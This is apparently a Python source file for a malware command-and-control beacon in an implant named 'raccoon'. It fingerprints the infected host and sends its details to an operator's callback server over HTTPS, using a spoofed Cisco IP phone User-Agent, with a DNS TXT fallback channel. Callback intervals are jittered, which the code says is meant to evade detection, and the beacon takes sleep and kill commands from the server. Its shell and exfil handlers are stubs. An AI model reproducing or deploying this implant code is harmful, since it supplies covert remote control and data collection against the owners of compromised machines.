#!/usr/bin/env python3
"""
C2 beacon with HTTPS primary and DNS fallback channels.
Jittered callback intervals to avoid detection patterns.
"""

import json
import time
import random
import base64
import hashlib
import logging
import platform
import socket
import threading
from typing import Optional

import requests
import dns.resolver

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

logger = logging.getLogger("raccoon.c2")


class Beacon:
    def __init__(self, config: dict):
        c2 = config["c2"]
        self.interval = c2["beacon_interval_seconds"]
        self.jitter = c2["jitter_percent"] / 100.0

        self.https_enabled = c2.get("https", {}).get("enabled", False)
        self.https_url = c2.get("https", {}).get("callback_url", "")
        self.verify_ssl = c2.get("https", {}).get("verify_ssl", False)

        self.dns_enabled = c2.get("dns", {}).get("enabled", False)
        self.dns_domain = c2.get("dns", {}).get("domain", "")
        self.dns_resolver = c2.get("dns", {}).get("resolver", "8.8.8.8")

        self._implant_id = self._generate_id()
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._key: Optional[bytes] = None

    def _generate_id(self) -> str:
        """Deterministic implant ID from hardware identifiers."""
        raw = f"{platform.node()}:{platform.machine()}"
        try:
            raw += f":{open('/sys/class/net/eth0/address').read().strip()}"
        except (FileNotFoundError, PermissionError):
            pass
        return hashlib.sha256(raw.encode()).hexdigest()[:16]

    def _jittered_sleep(self):
        offset = self.interval * self.jitter
        delay = self.interval + random.uniform(-offset, offset)
        time.sleep(max(10, delay))

    def _system_info(self) -> dict:
        return {
            "id": self._implant_id,
            "hostname": platform.node(),
            "os": f"{platform.system()} {platform.release()}",
            "arch": platform.machine(),
            "uptime": self._get_uptime(),
        }

    @staticmethod
    def _get_uptime() -> int:
        try:
            with open("/proc/uptime") as f:
                return int(float(f.read().split()[0]))
        except (FileNotFoundError, PermissionError):
            return 0

    def _beacon_https(self) -> Optional[dict]:
        """Send beacon via HTTPS and return any tasking."""
        try:
            resp = requests.post(
                self.https_url,
                json=self._system_info(),
                verify=self.verify_ssl,
                timeout=30,
                headers={"User-Agent": "CiscoIPPhone/1.0"},
            )
            if resp.status_code == 200:
                return resp.json()
        except Exception as e:
            logger.debug("HTTPS beacon failed: %s", e)
        return None

    def _beacon_dns(self) -> Optional[dict]:
        """Send beacon via DNS TXT query and parse response."""
        try:
            encoded_id = base64.b32encode(self._implant_id.encode()).decode().rstrip("=").lower()
            query = f"{encoded_id}.b.{self.dns_domain}"

            resolver = dns.resolver.Resolver()
            resolver.nameservers = [self.dns_resolver]
            resolver.timeout = 10
            resolver.lifetime = 10

            answers = resolver.resolve(query, "TXT")
            for rdata in answers:
                txt = b"".join(rdata.strings).decode()
                payload = base64.b64decode(txt)
                return json.loads(payload)
        except Exception as e:
            logger.debug("DNS beacon failed: %s", e)
        return None

    def _process_tasking(self, tasking: dict):
        """Process commands received from C2."""
        if not tasking:
            return

        cmd = tasking.get("cmd")
        if cmd == "sleep":
            new_interval = tasking.get("interval", self.interval)
            self.interval = new_interval
            logger.info("Sleep interval updated to %ds", new_interval)
        elif cmd == "kill":
            logger.warning("Kill command received — shutting down")
            self._running = False
        elif cmd == "shell":
            logger.info("Shell tasking received (execution delegated to operator)")
        elif cmd == "exfil":
            logger.info("Exfil tasking received")

    def _beacon_loop(self):
        logger.info("Beacon started — ID=%s interval=%ds jitter=%d%%",
                     self._implant_id, self.interval, int(self.jitter * 100))

        while self._running:
            tasking = None

            if self.https_enabled:
                tasking = self._beacon_https()

            if tasking is None and self.dns_enabled:
                tasking = self._beacon_dns()

            if tasking:
                logger.debug("Tasking received: %s", tasking.get("cmd", "unknown"))
                self._process_tasking(tasking)

            self._jittered_sleep()

    def start(self):
        self._running = True
        self._thread = threading.Thread(
            target=self._beacon_loop, daemon=True, name="c2-beacon"
        )
        self._thread.start()

    def stop(self):
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
        logger.info("Beacon stopped")
